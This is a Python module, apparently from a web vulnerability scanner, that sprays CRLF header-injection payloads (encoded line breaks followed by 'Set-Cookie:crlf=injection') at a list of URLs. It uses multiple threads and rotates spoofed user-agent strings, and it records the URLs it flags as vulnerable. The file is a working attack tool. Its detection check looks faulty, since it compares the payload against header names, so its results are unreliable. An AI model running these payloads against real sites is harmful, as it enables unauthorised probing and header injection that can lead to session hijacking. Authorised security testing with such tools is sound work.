import requests
import random 
from parametizer.progress import update_progress
from concurrent.futures import ThreadPoolExecutor
from colorama import Back, Fore, Cursor, init
from time import sleep
init()

user_agents = [
 "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
 "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
 "Mozilla/3.01 (Macintosh; PPC)",
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",  
 "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
 "Opera/8.00 (Windows NT 5.1; U; en)",  
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
]

user_agent = random.choice (user_agents)
headers = {'User-Agent': user_agent}


payloads = [
            "/%%0a0aSet-Cookie:crlf=injection",
            "/%0aSet-Cookie:crlf=injection",
            "/%0d%0aSet-Cookie:crlf=injection",
            "/%0dSet-Cookie:crlf=injection",
            "/%23%0aSet-Cookie:crlf=injection",
            "/%25%30%61Set-Cookie:crlf=injection",
            "/%3f%0dSet-Cookie:crlf=injection",
            "/%u000aSet-Cookie:crlf=injection"
]

def crlf(url,urls_vulnerables,threads):

    print()
    print('---------------------')
    print('\033[1;36m Testing CRLF: \033[0m') 
    print('---------------------')
    print()
    found=0
    total = len(url)    
    p=0

    def crlf_single(url,payload):
     
     nonlocal found,p

     full_url = url + payload
     response = requests.get(full_url,headers=headers)
     if payload in response.headers:
         found=found +1
         if found == 1:
                 urls_vulnerables.append('\n****************** VULNERABLE TO CRLF: *********************\n')
                 print (Cursor.BACK(50) + Cursor.UP(1) + '                                 ')          
         urls_vulnerables.append(full_url)
         print(f"\033[1;32m[+]\033[0m Vulnerable URL: {response.url}", end='\n')
     p+=1
     update_progress(p, total)

    with ThreadPoolExecutor(max_workers=threads) as executor:                      
       for linea in url:
          for payload in payloads:   
             executor.submit(crlf_single,linea,payload)

    if found >= 1:
     print()   
     print (Cursor.BACK(50) + Cursor.UP(1) +f'\033[1;32m[+] Found [{found}] results vulnerable to CRLF\033[0m')
    else:
     print (Cursor.BACK(50) + Cursor.UP(1) + '      '*80)        
     print(Cursor.BACK(50) + Cursor.UP(1) + "\033[1;31m[-] No results found\033[0m")
     print()        
